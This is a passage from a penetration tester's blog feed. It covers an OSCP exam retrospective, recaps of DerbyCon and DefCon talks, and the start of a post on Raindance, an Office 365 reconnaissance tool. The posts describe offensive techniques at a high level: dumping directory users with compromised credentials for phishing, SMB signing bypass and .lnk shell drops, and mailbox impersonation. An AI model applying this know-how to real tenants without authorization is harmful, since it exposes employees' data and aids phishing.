&lt;h3 id=&quot;7-i-was-over-caffeinated-over-confident-and-completely-exhausted&quot;&gt;7: I was over-caffeinated, over-confident, and completely exhausted&lt;/h3&gt;

&lt;p&gt;This mistake will often lead even good students to snatch defeat from the jaws of victory. The OSCP is a monster of an exam, and you will likely spend almost every hour trying to get the minimum 70 points unless you prepared like a champion. Like many others, I dug my own grave by&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Scheduling my exam late in the day (any time after 12pm is probably a bad idea)&lt;/li&gt;
  &lt;li&gt;Not sleeping well the night before (mostly because I was too excited)&lt;/li&gt;
  &lt;li&gt;Over-caffeination destroyed my ability to think clearly and left me not only physically but mentally exhausted.&lt;/li&gt;
  &lt;li&gt;Not taking breaks during the exam left me with tunnel-vision almost the entire time. I focused on 1 vulnerability that I was &lt;strong&gt;certain&lt;/strong&gt; would get me shell that ultimately was just a red herring.&lt;/li&gt;
  &lt;li&gt;Not sleeping, which … again … over-caffeination made life much harder. I tried, and was literally so jittery I could not force myself to sleep, so I forced myself to continue with no energy left in me. My fate was sealed at that point.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;wrap-up&quot;&gt;Wrap-up&lt;/h2&gt;
&lt;p&gt;Avoiding these mistakes will hopefully keep your head above water while taking the OSCP exam, but ultimately, the biggest key factor is your preparation. Spending ample time in the labs is essential to pass. If you are considering taking the OSCP, you should at a minimum take the 90-day course to start and add on as necessary. Take the exam as often as possible and don’t miss any opportunities, even if failure is a certainty, you have nothing to lose anyway, so you might as well take it and learn from it. Do your best.&lt;/p&gt;

&lt;p&gt;My OSCP journey still isn’t over, so I have more to share. Seeing how long this post has gotten, it’s worth a multi-part series and probably a lot more than that. I’ll let this first part stand as a &lt;strong&gt;How not to take the OSCP&lt;/strong&gt; because that’s exactly what it is. In the next part, I’ll cover how I switched things up and made some of my improvements for my second and third attempts at the exam.&lt;/p&gt;

&lt;p&gt;Thanks for reading and if you’re feeling like I did in that moment of defeat, just know that most of us have already been there. There will be another day, and you’ll do better next time. You just have to &lt;em&gt;Try Harder&lt;/em&gt;. :)&lt;/p&gt;</content><author><name>True Demon</name></author><summary type="html"></summary></entry><entry><title type="html">What I Learned at DerbyCon</title><link href="http://localhost:4000/2018/10/07/What-I-Learned-at-DerbyCon/" rel="alternate" type="text/html" title="What I Learned at DerbyCon" /><published>2018-10-07T00:00:00-04:00</published><updated>2018-10-07T00:00:00-04:00</updated><id>http://localhost:4000/2018/10/07/What-I-Learned-at-DerbyCon</id><content type="html" xml:base="http://localhost:4000/2018/10/07/What-I-Learned-at-DerbyCon/">&lt;p&gt;It’s been an exhausting week while couch-camping my way through another conference, but the sleep debt and neck-pain have been well worth it. Before I get into the details of what I learned while in Louisville, Kentucky for my first DerbyCon, a little about the conference itself. I have to admit that the TrustedSec folks know how to put on a good conference, this having been my third TS-hosted con that I’ve been to. After speaking at BSidesCLE earlier this summer on my last tool release, &lt;a href=&quot;https://github.com/true-demon/raindance&quot;&gt;Raindance&lt;/a&gt;, DerbyCon was massive.&lt;/p&gt;

&lt;p&gt;This year, after several years of pleading from the DerbyCon attendees, they decided to host this year’s conference at the Marriott Hotel in Downtown Louisville, a much needed step-up from its previous, smaller venues. Even after moving up to a much bigger hotel where the event took up two whole floors of the lobby, it was still packed with security enthusiasts, hackers, and tech-curious individuals all over the world. Having said that, it was extremely encouraging to see Benjamin (@GentilKiwi) Delpy, the infamous developer of MimiKatz, attending as a keynote speaker to kick off the conference.&lt;/p&gt;

&lt;h3 id=&quot;ring-ring-hello-can-i-have-your-social&quot;&gt;&lt;em&gt;Ring ring&lt;/em&gt; Hello. Can I have your Social?&lt;/h3&gt;

&lt;p&gt;My biggest highlights of the con definitely took place on the first day, packed with five of the most interesting and valuable talks of the year so far. I started off the day with a talk by Chris Hadnagy and Cat Murdock from Social-Engineer LLC. I’m not the most gifted social engineer, so I figured this would be a good place to start with their talk on “The IRS, HR, Microsoft, and your Grandma: What They All have in Common.” I found this talk highly interesting, even though it was mostly about math. It gave some amazing insight and statistics behind social engineering and your likelihood of success based on their last three years of vishing attacks against their clients. Even though the technical bits were missing, this talk was remarkably eye opening in terms of what pretexts work against what industries, what day is the most ideal to launch a vishing attack against your target, and what genders are better at (and more susceptible) to social engineering by phone. For those among you where this is a dedicated part of your attack methodology, I highly encourage watching this talk. It can certainly give you an edge with the surprising information gleaned with 3 years of data analyzed by some of the world’s more widely known social engineers.&lt;/p&gt;

&lt;h3 id=&quot;eternalblue--not-done-with-you-yet&quot;&gt;EternalBlue – not done with you yet.&lt;/h3&gt;

&lt;p&gt;I followed this up with a talk from @Zerosum0x0, on his research into the MS17-010 vulnerabilities, specifically EternalBlue, really tickled my exploit-developer pickle. The technical details behind how this exploit was introduced into the Windows SMB service have always eluded me. Nevertheless, it’s just something I wanted to know but could never understand. For anyone else in my position, Zerosum did an awesome job explaining, visualizing, and most of all demonstrating the cause and procedure that make the exploit possible from three different angles. Best of all, the breakdown of the assembler and specifying the vulnerable lines of code in the SMBv1 protocol that made these attacks possible tied all the knots for me.&lt;/p&gt;

&lt;p&gt;Given how old SMBv1 is, I was always surprised with how long this vulnerability went unnoticed. Having gotten an eye-opening glimpse into just how subtle the flaw was absolutely changed my perspective. At the same time, seeing how challenging it was to achieve that exploit and the fact that I feel like I actually understood some of it gave me some fuel to my fire to really begin chasing these kinds of exploits. Believe it or not, they still exist in all kinds of places, and thanks to the next talk I saw, I think I know where I’ll begin my search.&lt;/p&gt;

&lt;h3 id=&quot;windows-active-directory--yep-still-broke-p&quot;&gt;Windows Active Directory … Yep, still broke. :P&lt;/h3&gt;

&lt;p&gt;Next up was a joint talk by Will Schroeder (@Harmj0y), Lee Christiensen (@Tifkin_) and Matt Nelson (@Enigma0x3), talking about their latest escapades and “The Unintended Risks of Trusting Active Directory.” No exhaggeration - this was my favorite talk of the year. To summarize, the talk goes into the details of what actually happens when you introduce a system to a domain, and what that actually does in terms of “adjusting” each individual system’s security. This talk ties heavily into their previous year’s talk on “An ACE up the Sleeve” on security descriptors and the authorization model of the Windows Operating System. Essentially, it boils down to lists of what entities are allowed to touch/control/administrate certain services.&lt;/p&gt;

&lt;p&gt;Because Local Admins are (by default) given access to all the things, this tends to be our sole focus when trying to escalate. However, by demonstrating interesting flaws in the authorization model, combined with weak service protections, you can do some interesting things like implanting file-less backdoors, escalate privileges through service accounts, and naturally, achieve a total compromise of the host using nothing more than something as innocuous a “print queue request” to execute Mimikatz and establish persistence. By far, my favorite talk, and I know exactly where my focus for the year is going now thanks to them. Huge props to @Harmj0y, @Tifkin_, and @Enigma0x3 for their work this year with SpecterOps. :)&lt;/p&gt;

&lt;h2 id=&quot;ironpython--omfg-you-werent-kidding&quot;&gt;IronPython … omfg you weren’t kidding&lt;/h2&gt;

&lt;p&gt;I concluded the day with a talk I’d been curious about since I had seen it in the program, “IronPython … omfg” by Marcello Salvatti, who you may know better as @Byt3bl33d3r, the developer of other glorious
tools such as CrackMapExec and DeathStar (aka the DA Button). Initially, while I had heard of IronPython, I never was very interested in it. Honestly, I didn’t even know how it differed from my native C Python, so I never paid it any attention. Boy, was I ever wrong.&lt;/p&gt;

&lt;p&gt;So, the short version is that IronPython is the C# implementation of python, built using the .NET Framework in Windows. Because of this IronPython has some useful features for windows developers who like the beautiful simplicity of Python but also need .NET. Since I have lived on Linux since 2012, this explains why I never considered it. Having heard @byt3bl33d3r’s talk, my perspective has completely shifted to where I intend to start playing with this &lt;strong&gt;IMMEDIATELY&lt;/strong&gt;. The reason is because, like many red teamers who have come to rely upon native Windows tools like Powershell to perform local host recon and achieve privilege escalation in Windows have begun to see Microsoft and AV vendors begin adding protections that are absolutely kicking our asses.&lt;/p&gt;

&lt;p&gt;This doesn’t mean that powershell is over for us yet but… it’s in its twilight years. Executing malicious code in Powershell is definitely getting harder, so it’s time to start looking for new means to
gain back some lost ground. As it looks, IronPython may be that new secret weapon.&lt;/p&gt;

&lt;p&gt;The talk begins with Marcello’s long, frustrating journey with trying to find something that &lt;em&gt;just works&lt;/em&gt; when trying to execute some code to get some juicy shells while on those elusive engagements. After
much research and head-bashing, he is led to IronPython which I’ve said, is built using the .NET framework. Although several versions behind CPython, it still provides us some unique access and extreme versatility thanks to this access to an essential component of the new and improved Windows OS. Essentially, thanks to Marcello, the hard work of creating a “native” environment to execute iron python is done.&lt;/p&gt;

&lt;p&gt;This is accomplished by hooking the IPY (IronPython Engine) within .NET framework, then “sandboxing” a secondary IPY within the first IPY. This approach gives the attacker both access to the .NET framework through IronPython, and also a layer of separation when executing subsequent tasks. All this has been done with the latest release of &lt;a href=&quot;https://github.com/byt3bl33d3r/SilentTrinity&quot;&gt;SilentTrinity&lt;/a&gt; which you can download and contribute to on GitHub. Believe me, I plan on playing with this &lt;strong&gt;a lot&lt;/strong&gt; in the coming weeks. Time to brush up on some C# :)&lt;/p&gt;

&lt;h2 id=&quot;wrap-up&quot;&gt;Wrap up&lt;/h2&gt;

&lt;p&gt;DerbyCon 2018, being one of the biggest (and my first), was an absolute blast. Moreover, the talks were amazing. I’ll plan on continuing to watch many more of them as they land on IronGeek (props to
Adrian Crenshaw (@irongeek_adc) for your camera work). It’s been a really hectic summer that is finally beginning to wind down. Thanks to the added inspiration gathered from the infectious, likeminded individuals I connected with in Louisville, I plan on dropping far more contributions and exploring all the links, notes, and knowledge gained this past week. Thanks again to the TS staff for putting it together and setting up an awesome con.&lt;/p&gt;</content><author><name>True Demon</name></author><summary type="html">It’s been an exhausting week while couch-camping my way through another conference, but the sleep debt and neck-pain have been well worth it. Before I get into the details of what I learned while in Louisville, Kentucky for my first DerbyCon, a little about the conference itself. I have to admit that the TrustedSec folks know how to put on a good conference, this having been my third TS-hosted con that I’ve been to. After speaking at BSidesCLE earlier this summer on my last tool release, Raindance, DerbyCon was massive.</summary></entry><entry><title type="html">DefCon from the Eyes of a Newb</title><link href="http://localhost:4000/2018/08/14/DefCon-from-the-eyes-of-a-Newb/" rel="alternate" type="text/html" title="DefCon from the Eyes of a Newb" /><published>2018-08-14T00:00:00-04:00</published><updated>2018-08-14T00:00:00-04:00</updated><id>http://localhost:4000/2018/08/14/DefCon-from-the-eyes-of-a-Newb</id><content type="html" xml:base="http://localhost:4000/2018/08/14/DefCon-from-the-eyes-of-a-Newb/">&lt;p&gt;I had the opportunity and pleasure of getting to take a trip to Las Vegas during one of the largest hacking and security conferences in the world for the first time this past week. DefCon has always been one of those “Yeah, it’d be nice, but it’ll never happen” kinds of experiences, or so I used to think. Thanks to the noble sacrifice of one heroic co-worker, who gave his plane seat that others may go forth in his stead, I had that chance.&lt;/p&gt;

&lt;h2 id=&quot;welcome-to-defcon&quot;&gt;Welcome to Defcon&lt;/h2&gt;

&lt;p&gt;Although I consider myself to be reasonably experienced in penetration testing, I anticipated the entire trip to be a profoundly humbling experience. I’ve always believed that if you want to learn from others, you need to approach them with the understanding that you don’t know squat. I can honestly say, that attitude paid off in massive dividends as I walked among some of the brightest minds in Computer Science and discussed my favorite subjects with them. Defcon 26 was my first DefCon ever, and I’m determined to return again with much more to offer than what I took this time around. For the sake of doing it the justice it deserves, I’m here to tell everyone about the magical, tourist-trap wonderland of Las Vegas through the eyes of a bright-eyed 1337 wannabe in the midst of the chaos of the largest hacker event he has ever seen.&lt;/p&gt;

&lt;h2 id=&quot;the-arrival&quot;&gt;The Arrival&lt;/h2&gt;

&lt;p&gt;After a grueling 5 hours on planes, sad between two fat, sweaty dudes who smelled like John Cena’s gym shoes, 3 excessively awkward Uber/Lyft/Taxi rides trying to meander my way through conversations with the drivers, and wading through a sea of half-naked bird-women, buff, shirtless cowboys &amp;amp; mildly murderous Las Vegas traffic, I arrived at Caesar’s palace at roughly 1500 hours, Thursday, August 9, 2018. The entire event held from the second &amp;amp; third floors of the casino conference center was teaming with what I can best describe as my favorite kinds of people on the planet.&lt;/p&gt;

&lt;p&gt;The sheer number of hackers in one place was overwhelming, and it almost makes you want to rip the battery from your phone at first sight. Registration, as promised, is a cash-only exchange. No names, no ID, no problems. After receiving my adorable DefCon PCB badge, guidebook, and a sheet of some badass stickers to add to my collection, myself and the small group I was with meandered into the casino to appreciate the confused looks of the ordinary casino-goers as thousands of people in all black drab and blinking badges passed over the casino floor.&lt;/p&gt;

&lt;h2 id=&quot;hacker-conduct&quot;&gt;Hacker Conduct&lt;/h2&gt;

&lt;p&gt;I’ll first let it be said that I personally has not one single negative experience in my interactions with the other attendees. The entire conference was a place of cooperation, competition, and knowledge swapping that you simply don’t get from your local hang-outs. Just to put it into perspective, DefCon printed more than 26,000 badges in anticipation of attendance. That’s a TON of ideas and Wi-Fi packets floating around in one place. That being said, there was a lot of interactions, all positive in their own ways, with the other attendees. And … to the best of my knowledge, I didn’t get pwned, so… awesome experience! Honestly, everyone is so busy learning from each other and so obnoxiously paranoid that it wouldn’t be worthwhile in my opinion to target conference attendees, but that’s just me.&lt;/p&gt;

&lt;p&gt;Plenty of other events did transpire while there that many would easily consider not so good, though not to the fault of any of the DefCon facilitators. In an unfortunate case of @0xMatt who was ejected from the casino for making a hypothetical &lt;a href=&quot;https://twitter.com/0xMatt/status/1027661604559544320&quot;&gt;statement&lt;/a&gt; on Twitter about who would make for ideal targets for [cyber] attacks in a network so saturated as the DefCon NOC. The response from the hotel, who refused to allow a clarification of the context, was to threaten him with arrest, prosecution, issued a trespass warning, and effectively put a restraining order (which has now been repealed). It was made very clear, day one, that the casino was prepared to have us jailed and prosecuted for anything they could consider a threat or misconduct.&lt;/p&gt;

&lt;p&gt;Personally, I saw the whole thing as an absurd show of force on the hotel staff’s part, much less than any kind of reasonable response to an actual threat. It was the first debacle of several during DefCon which thoroughly pissed off a lot of people.&lt;/p&gt;

&lt;p&gt;For that reason … many googly eyes were left behind in retaliation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://pbs.twimg.com/media/DkN8jPnU4AAvyFt.jpg:small&quot; alt=&quot;Googly Socates&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;casino-staff-conduct&quot;&gt;Casino Staff Conduct&lt;/h2&gt;

&lt;p&gt;Oh you knew I’d be talking about this one. Yeah, the casino staff started popping locks and busting into rooms like wannabe feds. Well… not literally, I’m sure they had keys, but such a gross invasion of your personal space is no less disturbing as if they kicked in the door. It was supposedly communicated (extremely vaguely, I’m sure) to the DefCon staff that room searches would be standard procedure. What actually ended up happening was unannounced searches and seizures of property by hotel staff from attendees rooms. Personal effects had been rummaged through when guests were not around, and when they were, protests to any search were responded to with a threat of eviction from the casino and potentially accompanying charges.&lt;/p&gt;

&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;en&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;🚨 WARNING HACKERS 🚨&lt;br /&gt;Ceasars staff are performing &amp;quot;random&amp;quot; security checks of rooms. If you opt out of room cleaning and used defcon discount they will check your room and WILL confiscate soldering irons + more!&lt;br /&gt;&lt;br /&gt;Not a drill! Spread the word!&lt;a href=&quot;https://twitter.com/hashtag/defcon?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#defcon&lt;/a&gt; &lt;a href=&quot;https://twitter.com/hashtag/badgelife?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#badgelife&lt;/a&gt; &lt;a href=&quot;https://twitter.com/hashtag/dc26?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#dc26&lt;/a&gt; &lt;a href=&quot;https://twitter.com/hashtag/DEFCON26?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#DEFCON26&lt;/a&gt;&lt;/p&gt;&amp;mdash; Andrew Wolf (@really_awolf) &lt;a href=&quot;https://twitter.com/really_awolf/status/1028062678881693697?ref_src=twsrc%5Etfw&quot;&gt;August 10, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async=&quot;&quot; src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

&lt;p&gt;The cited excuse of the hotel staff was attributed to new policies in the wake of the Las Vegas shooting in October 2017. In my research of the whole scenario, the shooter at the time had been visited by room service &amp;amp; cleaning staff several times, meanwhile stockpiling weapons in his room unimpeded. The obvious ineffective strategy of strip-searching your guests’ rooms; however, did not stop the hotel staff from confiscating soldering irons, lockpick sets, various hardware while searching through guests personal items without consent or cause regardless of whether the person was in the room. I was lucky in that my group and I chose to stay off the strip for a cheaper alternative. That choice (AirBnB) is now my only alternative, as far as I’m concerned.&lt;/p&gt;

&lt;p&gt;For those attendees in the future, if you don’t want your stuff searched and seized by the hotel, you’re better off not staying there. The blatant &lt;a href=&quot;https://pbs.twimg.com/media/DkRtYrgVAAEwP0C.jpg&quot;&gt;middle-finger&lt;/a&gt; raised by Caesar’s Palace in response to any privacy concerns punctuates the fact that they were far less interested in making sure their guests felt “safe” than they were in making sure they could &lt;a href=&quot;http://www.latimes.com/nation/la-na-mgm-lawsuit-vegas-shooting-20180717-story.html&quot;&gt;avoid law-suits&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;the-talks&quot;&gt;The Talks&lt;/h2&gt;

&lt;p&gt;I was admittedly pretty selective of the talks I went to while at DefCon, although the few I did attend had a lot to offer. Two I will immediately call out were “God Mode Unlocked: hardware backdoors in x86 CPUs” from Christopher Domas and “SMBetray: Backdooring and breaking signatures” from William Martin.&lt;/p&gt;

&lt;p&gt;The sheer effort put into the research that led these two researchers to discover their findings was unbelievable. Starting with Godmode Unlocked, Domas uncovered a series of secret instructions within x86 architecture CPUs that allowed him to execute any code he desired with kernel-mode privileges by setting what he called the “godmode bit.” Upon release, I strongly recommend this talk to any hardware hackers and/or exploit developers that work this close to the assembler. Because of Domas’ findings x86 architecture is, without a doubt, going to be kaboshed, especially in the event his PoC lands publicly.&lt;/p&gt;

&lt;p&gt;For SMBetray, a tool developed by William Martin, it breathes new life into MitM attacks on Windows networks beyond SMB Relaying credentials. Simply put, Martin was successful in reverse engineering the SMB protocol’s authentication scheme when &lt;strong&gt;SMB Signature Signing&lt;/strong&gt; is in place. His discovery was shockingly underwhelming in the sense that the only thing required to validate the signature is the client-side username and password.&lt;/p&gt;

&lt;p&gt;Again … The only thing needed to break SMB Signature Signing is the username and password of the authenticating client. Although we may not necessarily have this at the time of the initial attack, and doesn’t help us if we are trying to gain admin access to a target server, obtaining these credentials can often be as simple as feeding the challenged hash into JTR. In any case, where the credentials are known, SMBetray allows new possibilities like downgrading the authentication schema to NTLM from Kerberos, as well as intercepting and downloading files mid-stream over an authenticated SMB Session. Lastly, my favorite feature, is the ability to replace existing files with a .lnk equivalents to execute a shell on target systems.&lt;/p&gt;

&lt;p&gt;For a thorough explanation on the tool and the abuse of this flaw, check out Will Martin’s blog at &lt;a href=&quot;https://quickbreach.io&quot;&gt;QuickBreach Blog&lt;/a&gt; and feel free to download his awesome tool at &lt;a href=&quot;https://github.com/quickbreach/SMBetray&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;But the talks are just the beginning of what DefCon had to offer, and the real educating events of the con took place in unexpected corners.&lt;/p&gt;

&lt;h2 id=&quot;badge-hardware-hacking&quot;&gt;Badge (Hardware) Hacking&lt;/h2&gt;

&lt;p&gt;So, I made it my personal mission to hack the DefCon 26 badge before the con was over … aaaaaand failed miserably. But that’s somewhat to be expected. First of all, the badge was extremely unique and took the usual badge-hacking events to a new level by implementing a game within the badge itself.&lt;/p&gt;

&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;en&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Finally arrived at my first ever &lt;a href=&quot;https://twitter.com/hashtag/DefCon?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#DefCon&lt;/a&gt;&lt;br /&gt;So it begins... &lt;a href=&quot;https://t.co/6tkYkJGrDL&quot;&gt;pic.twitter.com/6tkYkJGrDL&lt;/a&gt;&lt;/p&gt;&amp;mdash; True Demon (@TRUExDEMON) &lt;a href=&quot;https://twitter.com/TRUExDEMON/status/1027707745779167232?ref_src=twsrc%5Etfw&quot;&gt;August 10, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async=&quot;&quot; src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

&lt;p&gt;My unfortunate failure to turn all of my Defcon letters green (got all red) led me to seek help from the hardware hacking village. After visiting, I quickly felt overwhelmed by the sheer number of people at tables with fully stocked soldering kits and heat guns ripping the transistors &amp;amp; capacitors from their badges, soldering leads into the JTAG interfaces, and so on, I realized just how out of my league I was.&lt;/p&gt;

&lt;p&gt;That feeling is something you get used to at DefCon. Even seasoned experts can quickly feel out of place in areas where your individual knowledge is trumped by just the sight of dozens of people with an intimate understanding of something you can scarcely grasp. My experience in the hardware hacking section was brief but magical. Just passing over the tables, asking questions from people working on various PCBs (not just badges) led me to new research I’d previously never dared to venture.&lt;/p&gt;

&lt;p&gt;I eventually found myself seeking out new information that led me to a &lt;a href=&quot;https://github.com/firelizzard18/dc26-badge&quot;&gt;GitHub repo&lt;/a&gt; put up by a handful of hackers who managed to reverse engineer the &lt;em&gt;Badginal Intercourse&lt;/em&gt; protocol. This is what was used by the DefCon badges to interface with each other, and even provided a tool to replay the packets used to unlock various portions of the badge puzzle.&lt;/p&gt;

&lt;p&gt;The further I dug into the research, the more I found myself learning about hardware hacking than I’d even considered myself capable of. Just the asking “How the FORK does this thing even work!?” forced me to push my own boundaries and introduced me to a new kind of hacking I’d never seen myself trying. And &lt;strong&gt;THAT&lt;/strong&gt; even by itself made the entire plane ride worth while …&lt;/p&gt;

&lt;h2 id=&quot;competition&quot;&gt;COMPETITION!&lt;/h2&gt;

&lt;p&gt;Oh the competition! The CTF challenges, the Hack Fortress arena, the VulnLab Creation Station, and even a karaoke stage presented me with limitless choices to embarass myself in front of hackers across the planet. In the end, I stuck to my familiar places and ended up at two separate lockpicking stations. In the packet hacking village, of all places, I encountered the &lt;em&gt;Locksmith’s Gauntlet&lt;/em&gt; which was a race-to-the-finish style of lockpicking challenge where you were pitted against a 5-stage series of three locks each, ranked easy, medium, and hard.&lt;/p&gt;

&lt;p&gt;Just the setup itself was impressive enough to draw a crowd as people came up to race against the clock for the highest score, earning points for locks based on their difficulty and earning bonuses for completing earlier than the 5-minute time limit. My score was none too impressive, looking at the top 5 who were able to crack 4 of the 5 hard locks in under 1 minute, and one person who finished the gauntlet in under a minute. Even so, it was an awesome way to demonstrate your deftness, speed, and precision with a pick &amp;amp; rake.&lt;/p&gt;

&lt;p&gt;Next was the Warl0ck Gamez CTF, with points earned for one of three challenges:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Finish first in sudden-death Fortnight matches – Not my forte (forgive me xD)&lt;/li&gt;
  &lt;li&gt;Complete hacking challenges in a jeopardy style online CTF, hacking various countries on a map.&lt;/li&gt;
  &lt;li&gt;Pick locks for points &amp;amp; swag, which I proudly earned 100% of rewards&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://pbs.twimg.com/media/DkXZ3y3U8Ac-bG4.jpg:small&quot; alt=&quot;Dope Poker Chip&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All in all, the competition was a welcome distraction from the constant bombardment of knowledge and information that anyone simply cannot take in all at once.&lt;/p&gt;

&lt;h2 id=&quot;the-wrap-up&quot;&gt;The Wrap-up&lt;/h2&gt;

&lt;p&gt;DefCon 26 was an unforgettable, humbling, amazing experience that really solidified all the reasons why I fell in love with hacking in the first place. Obviously, I’m looking forward to going back, hopefully without fear of being strip-searched at the doors of the casino and definitely with a new perspective. Walking in for the first time, I had no idea where to even start. Looking back, even after experiencing so much of the con, I missed out on a lot, but no moment was wasted. It’s hard to make sense of all deez feelz, but I intend on coming back next year with something to offer a renewed hunger.&lt;/p&gt;

&lt;p&gt;If there is one thing DefCon will remind you of, it will be that, for all of our differences and our wide breadth &amp;amp; gaps of knowledge, in the end &lt;em&gt;“we are all alike.”&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;– See you at DefCon 27&lt;/p&gt;</content><author><name>True Demon</name></author><summary type="html">I had the opportunity and pleasure of getting to take a trip to Las Vegas during one of the largest hacking and security conferences in the world for the first time this past week. DefCon has always been one of those “Yeah, it’d be nice, but it’ll never happen” kinds of experiences, or so I used to think. Thanks to the noble sacrifice of one heroic co-worker, who gave his plane seat that others may go forth in his stead, I had that chance.</summary></entry><entry><title type="html">Raindance: Raining Recon from the Microsoft Cloud</title><link href="http://localhost:4000/2018/06/26/Raindance/" rel="alternate" type="text/html" title="Raindance: Raining Recon from the Microsoft Cloud" /><published>2018-06-26T00:00:00-04:00</published><updated>2018-06-26T00:00:00-04:00</updated><id>http://localhost:4000/2018/06/26/Raindance</id><content type="html" xml:base="http://localhost:4000/2018/06/26/Raindance/">&lt;p&gt;If you’ve been performing penetration tests for the last several months, then you may have encountered Office 365 in your travels. Office 365 (O365) for the sake of clarity, is the latest and greatest Cloud solution for various popular Microsoft services including Exchange, Sharepoint, Database management, and a cloud-based active directory serviced called Azure Active Directory. It’s a great service for businesses of all sizes, except that it just a bit too user-friendly for its own good.&lt;/p&gt;

&lt;p&gt;O365 started with its initial release in June 2011 and has grown into one of the most widely used enterprise cloud platforms. The beauty of it was the ability for all of these services to be made available through the cloud, meaning publicly/remotely accessible, configurable, and manageable. The unfortunate downside is the security implications this has.&lt;/p&gt;

&lt;h2 id=&quot;story-time&quot;&gt;Story time&lt;/h2&gt;
&lt;p&gt;After discovering in 2015 that Office 365 could be managed through Powershell, my job became learning how to make my life easier by using Powershell to automate anything and everything I could in the platform. Fast-forward 2 years later after having shifted my career path exclusively to red-teaming and network penetration, it became my target.&lt;/p&gt;

&lt;p&gt;A colleague of mine was on a pentest, and while observing him work, he became stuck after acquiring user credentials and having no VPN or login portal to use them on. All he had was email, which wasn’t quite what he was hoping for. Remembering that I knew how to log into Office 365 with Powershell, I offered to help him out by getting him a list of domain users to do with what he pleased.&lt;/p&gt;

&lt;p&gt;After I explained a few brief Powershell commands and helped him install the necessary modules, we logged into their O365 tenant via powershell and I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-MsolUser -All&lt;/code&gt; against it. Like clockwork, Powershell started dumping out the entire list of domain users. Not only that, it gave up all of their email aliases, mobile numbers, office locations, job titles, and just a metric ton of useful information he could use to craft a &lt;strong&gt;VERY&lt;/strong&gt; elaborate internal phishing email.&lt;/p&gt;

&lt;p&gt;I walked away from that engagement thinking to myself,&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;“Man, it would be awesome if we had a tool that did all that for us. That way we wouldn’t need to know all these obscure Powershell commands.”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Well, such a tool didn’t exist, and I had a &lt;em&gt;lot&lt;/em&gt; of free time on my hands, so I set to building my first open-source project, &lt;a href=&quot;https://github.com/True-Demon/Raindance&quot;&gt;Raindance&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;crafting-the-tool&quot;&gt;Crafting the Tool&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/images/raindance/Raindance-Title.png&quot; alt=&quot;Raindance-Title&quot; /&gt;
Building RainDance was relatively short and simple while I had access to a working cloud instance of O365. The Powershell commands for the MSOnline and AzureAD modules are very well documented, and I had some cursory working knowledge of the commands before hand thanks to my work experience with Office 365 as a Cloud Admin those few years ago.&lt;/p&gt;

&lt;p&gt;However, I quickly learned that accessing the Cloud yielded way more than just usernames. Digging further into the modules, I found many more things that could be pulled out of the Cloud, and over time it continued to grow. What was meant to be maybe a 20-line script turned into a decently sized library of Powershell code that effectively turned user-level O365 access into a reconnaissance gold mine.&lt;/p&gt;

&lt;p&gt;Just some things you can pull out of Office 365 with effective working knowledge of Powershell:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;List of domains joined to the O365 tenant&lt;/li&gt;
  &lt;li&gt;List of valid subscriptions &amp;amp; software licenses&lt;/li&gt;
  &lt;li&gt;All users &amp;amp; their configured properties in O365
    &lt;ul&gt;
      &lt;li&gt;User principal name&lt;/li&gt;
      &lt;li&gt;Email&lt;/li&gt;
      &lt;li&gt;Mobile &amp;amp; Desk phone numbers&lt;/li&gt;
      &lt;li&gt;Street address, Office, building, room, &amp;amp; in some cases mailbox numbers&lt;/li&gt;
      &lt;li&gt;Device names (&amp;amp; properties) the user has joined to the Cloud&lt;/li&gt;
      &lt;li&gt;Services &amp;amp; permissions given to the user&lt;/li&gt;
      &lt;li&gt;The last time the user changed their password&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;All mail distribution &amp;amp; security groups&lt;/li&gt;
  &lt;li&gt;All security roles configured within O365&lt;/li&gt;
  &lt;li&gt;All &lt;em&gt;members&lt;/em&gt; of security roles within O365 (including administrators)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You can also pull Email inboxes and search through user Exchange mailboxes. Not only that, I discovered that, with global/company administrator access (Cloud version of Domain Admin), it is possible to impersonate &lt;em&gt;other users’ inboxes&lt;/em&gt; and search through them as well. You can even download an entire user inbox to your local machine over Powershell, or simply search through it on the Exchange Online tenant without ever having any Email data pass over the network.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Needless to say, this had &lt;em&gt;ton&lt;/em&gt; of potential.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;presenting-the-tool&quot;&gt;Presenting the Tool&lt;/h2&gt;

